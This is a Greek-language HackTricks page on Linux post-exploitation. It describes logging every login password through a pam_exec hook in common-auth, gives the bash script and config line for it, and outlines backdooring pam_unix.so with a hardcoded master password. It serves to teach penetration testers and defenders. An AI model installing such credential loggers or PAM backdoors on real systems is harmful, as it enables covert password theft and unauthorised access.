# Linux Μετά την Εκμετάλλευση

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Καταγραφή Κωδικών Σύνδεσης με το PAM

Ας διαμορφώσουμε ένα PAM module για να καταγράφει κάθε κωδικό πρόσβασης που χρησιμοποιεί ο κάθε χρήστης για να συνδεθεί. Εάν δεν γνωρίζετε τι είναι το PAM, ελέγξτε:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**Για περισσότερες λεπτομέρειες, ανατρέξτε στην [αρχική ανάρτηση](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Αυτό είναι απλώς ένα σύνοψη:

**Επισκόπηση Τεχνικής:**
Τα Pluggable Authentication Modules (PAM) προσφέρουν ευελιξία στη διαχείριση της πιστοποίησης σε συστήματα βασισμένα σε Unix. Μπορούν να ενισχύσουν την ασφάλεια προσαρμόζοντας τις διαδικασίες σύνδεσης, αλλά μπορούν επίσης να δημιουργήσουν κινδύνους εάν χρησιμοποιηθούν εσφαλμένα. Αυτή η σύνοψη περιγράφει μια τεχνική για την καταγραφή διαπιστευτηρίων σύνδεσης χρησιμοποιώντας το PAM, μαζί με στρατηγικές αντιμετώπισης.

**Καταγραφή Διαπιστευτηρίων:**
- Δημιουργείται ένα bash script με το όνομα `toomanysecrets.sh` για να καταγράφει τις προσπάθειες σύνδεσης, καταγράφοντας την ημερομηνία, το όνομα χρήστη (`$PAM_USER`), τον κωδικό πρόσβασης (μέσω stdin) και την απομακρυσμένη διεύθυνση IP του υπολογιστή (`$PAM_RHOST`) στο `/var/log/toomanysecrets.log`.
- Το script καθίσταται εκτελέσιμο και ενσωματώνεται στη διαμόρφωση του PAM (`common-auth`) χρησιμοποιώντας το module `pam_exec.so` με επιλογές για να εκτελείται αθόρυβα και να αποκαλύπτει το διαπιστευτήριο πιστοποίησης στο script.
- Η προσέγγιση δείχνει πώς μπορεί να εκμεταλλευτεί ένας παραβιασμένος Linux υπολογιστής για να καταγράψει διαπιστευτήρια σύνδεσης απόκρυφα.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Τοποθέτηση πίσω πόρτας στο PAM

**Για περισσότερες λεπτομέρειες, ανατρέξτε στην [αρχική ανάρτηση](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Αυτό είναι απλώς ένα σύνοψη:

Το Pluggable Authentication Module (PAM) είναι ένα σύστημα που χρησιμοποιείται στο Linux για την αυθεντικοποίηση των χρηστών. Λειτουργεί με βάση τρεις βασικές έννοιες: **όνομα χρήστη**, **κωδικό πρόσβασης** και **υπηρεσία**. Τα αρχεία ρυθμίσεων για κάθε υπηρεσία βρίσκονται στον κατάλογο `/etc/pam.d/`, όπου κοινόχρηστες βιβλιοθήκες χειρίζονται την αυθεντικοποίηση.

**Στόχος**: Τροποποιήστε το PAM για να επιτρέπει την αυθεντικοποίηση με έναν συγκεκριμένο κωδικό πρόσβασης, παρακάμπτοντας τον πραγματικό κωδικό πρόσβασης του χρήστη. Αυτό επικεντρώνεται ιδιαίτερα στην κοινόχρηστη βιβλιοθήκη `pam_unix.so` που χρησιμοποιείται από το αρχείο `common-auth`, το οποίο συμπεριλαμβάνεται από σχεδόν όλες τις υπηρεσίες για τον έλεγχο του κωδικού πρόσβασης.

### Βήματα για την τροποποίηση του `pam_unix.so`:

1. **Εντοπίστε την Οδηγία Αυθεντικοποίησης** στο αρχείο `common-auth`:
- Η γραμμή που είναι υπεύθυνη για τον έλεγχο του κωδικού πρόσβασης του χρήστη καλεί το `pam_unix.so`.
2. **Τροποποιήστε τον Πηγαίο Κώδικα**:
- Προσθέστε μια συνθήκη στον πηγαίο κώδικα του αρχείου `pam_unix_auth.c` που επιτρέπει την πρόσβαση εάν χρησιμοποιείται ένας προκαθορισμένος κωδικός πρόσβασης, διαφορετικά συνεχίζει με την κανονική διαδικασία αυθεντικοποίησης.
3. **Επαναμεταγλωττίστε και Αντικαταστήστε** την τροποποιημένη βιβλιοθήκη `pam_unix.so` στον κατάλληλο κατάλογο.
4. **Δοκιμή**:
- Η πρόσβαση επιτρέπεται σε διάφορες υπηρεσίες (σύνδεση, ssh, sudo, su, screensaver) με τον προκαθορισμένο κωδικό πρόσβασης, ενώ οι κανονικές διαδικασίες αυθεντικοποίησης παραμένουν ανέπαφες.

{% hint style="info" %}
Μπορείτε να αυτοματοποιήσετε αυτήν τη διαδικασία με το [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
